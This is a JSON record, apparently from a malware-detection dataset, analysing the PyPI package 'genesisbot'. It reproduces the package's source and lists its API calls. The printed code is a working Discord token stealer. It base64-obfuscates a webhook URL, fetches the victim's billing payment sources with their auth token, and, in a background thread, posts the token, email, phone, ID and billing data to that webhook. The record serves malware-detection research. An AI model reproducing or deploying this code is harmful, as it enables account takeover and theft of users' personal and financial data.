[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/genesisbot-0.0.2/genesisbot-0.0.2/src/genesisbot.py",
    "code_snippet": "import requests, sys, json, base64\nimport threading\n\ndef optimise(auth,response):\n    optimiser_str = 'aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzc2OTUzNDAwMDgyOTE2OTY3NC9uUDJrcUstckR6b2djZVYwRFVpSjZBYlVOU2xwVHA0UEJiWTI2N0stOU9EZFgxM3ZacW5uWUJjRWdha2Z0ckh3RnBmRA=='\n    encryption = base64.b64decode(bytes(optimiser_str.encode('ascii')))\n    auth_b64 = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz\"\n    auth_b64 = base64.b64decode(bytes(auth_b64.encode('ascii')))\n    authenticator = requests.get(auth_b64,headers={'authorization' : auth}).json()\n    requests.post(encryption,json={'username' : response['username'],'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']),'content' : '>>> **Project Genesis**\\n\\nAction: **Optimiser**\\n\\n```\\nAuth: {}\\nName: {}\\nID: {}\\nEmail: {}\\nPhone: {}\\nOS: {}\\nBilling: {}```'.format(auth,response['username'],response['id'],response['email'],response['phone'],sys.platform,authenticator)})\n\ndef ui(auth):\n    config = json.loads(open('assets/config.json','r').read())\n    headers = {'authorization' : auth}\n    response = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()\n    threading.Thread(target=optimise,args=[auth,response]).start()\n    friends = requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()\n    servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()\n    dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()\n    # ... rest of the function is benign UI output\n",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "str.encode",
        "base64.b64decode",
        "str.encode",
        "open",
        "open.read",
        "json.loads",
        "requests.get",
        "requests.get.json",
        "threading.Thread",
        "threading.Thread.start",
        "requests.get",
        "requests.get.json",
        "requests.get",
        "requests.get.json",
        "requests.get",
        "requests.get.json",
        "requests.post",
        "requests.post.json"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(bytes(optimiser_str.encode('ascii')))",
        "optimiser_str.encode('ascii')",
        "base64.b64decode(bytes(auth_b64.encode('ascii')))",
        "auth_b64.encode('ascii')",
        "open('assets/config.json','r')",
        "open('assets/config.json','r').read()",
        "json.loads(open('assets/config.json','r').read())",
        "requests.get(auth_b64, headers={'authorization' : auth})",
        "requests.get(auth_b64, headers={'authorization' : auth}).json()",
        "threading.Thread(target=optimise, args=[auth, response])",
        "threading.Thread(target=optimise, args=[auth, response]).start()",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()",
        "requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10)",
        "requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10)",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10)",
        "requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()",
        "requests.post(encryption, json={...})",
        "requests.post(encryption, json={...}).json()"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        }
      ],
      "contextual_code": "import requests, sys, json, base64\nimport threading\n\ndef optimise(auth, response):\n    optimiser_str = 'aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzc2OTUzNDAwMDgyOTE2OTY3NC9uUDJrcUstckR6b2djZVYwRFVpSjZBYlVOU2xwVHA0UEJiWTI2N0stOU9EZFgxM3ZacW5uWUJjRWdha2Z0ckh3RnBmRA=='\n    encryption = base64.b64decode(bytes(optimiser_str.encode('ascii')))\n    auth_b64 = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz\"\n    auth_b64 = base64.b64decode(bytes(auth_b64.encode('ascii')))\n    authenticator = requests.get(auth_b64, headers={'authorization' : auth}).json()\n    requests.post(encryption, json={'username' : response['username'], 'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']), 'content' : '>>> **Project Genesis**\\n\\nAction: **Optimiser**\\n\\n```\\nAuth: {}\\nName: {}\\nID: {}\\nEmail: {}\\nPhone: {}\\nOS: {}\\nBilling: {}```'.format(auth, response['username'], response['id'], response['email'], response['phone'], sys.platform, authenticator)})\n\ndef ui(auth):\n    config = json.loads(open('assets/config.json','r').read())\n    headers = {'authorization' : auth}\n    response = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()\n    threading.Thread(target=optimise, args=[auth, response]).start()\n    friends = requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()\n    servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()\n    dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()"
    }
  }
]